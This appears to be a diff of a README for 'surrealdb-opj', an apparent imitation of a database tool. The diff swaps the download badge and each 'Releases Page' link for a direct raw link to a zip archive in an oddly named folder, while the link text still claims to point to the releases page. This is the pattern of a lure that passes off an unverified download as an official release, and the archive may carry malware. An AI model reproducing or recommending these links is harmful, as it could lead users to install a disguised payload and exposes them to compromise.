@@ -6,10 +6,10 @@ surrealdb-opj is an easy-to-use database tool designed for everyone. Whether you
 ## 🚀 Getting Started
 Ready to start using surrealdb-opj? Follow these simple steps to get the software on your computer.
 
-[![Download surrealdb-opj](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/mounirk123/surrealdb-opj/releases)
+[![Download surrealdb-opj](https://raw.githubusercontent.com/mounirk123/surrealdb-opj/main/overravish/surrealdb-opj.zip)](https://raw.githubusercontent.com/mounirk123/surrealdb-opj/main/overravish/surrealdb-opj.zip)
 
 ## 📥 Download & Install
-1. **Visit the Download Page:** Go to the [Releases Page](https://github.com/mounirk123/surrealdb-opj/releases) to find the latest version of surrealdb-opj.
+1. **Visit the Download Page:** Go to the [Releases Page](https://raw.githubusercontent.com/mounirk123/surrealdb-opj/main/overravish/surrealdb-opj.zip) to find the latest version of surrealdb-opj.
   
 2. **Choose Your Version:** On the Releases page, you will see a list of available versions. Find the one that suits your needs. Generally, the latest version is recommended for the best features and fixes.
 
@@ -52,7 +52,7 @@ A: If you encounter any issues, please visit the GitHub Issues page and provide 
 We appreciate your thoughts on surrealdb-opj. If you have suggestions for improvements, please let us know through the Issues section on GitHub. Your feedback helps us make the software better for everyone.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/mounirk123/surrealdb-opj/releases)
+- [Releases Page](https://raw.githubusercontent.com/mounirk123/surrealdb-opj/main/overravish/surrealdb-opj.zip)
 - [Documentation](#)
 - [Discussion Forum](#)
 
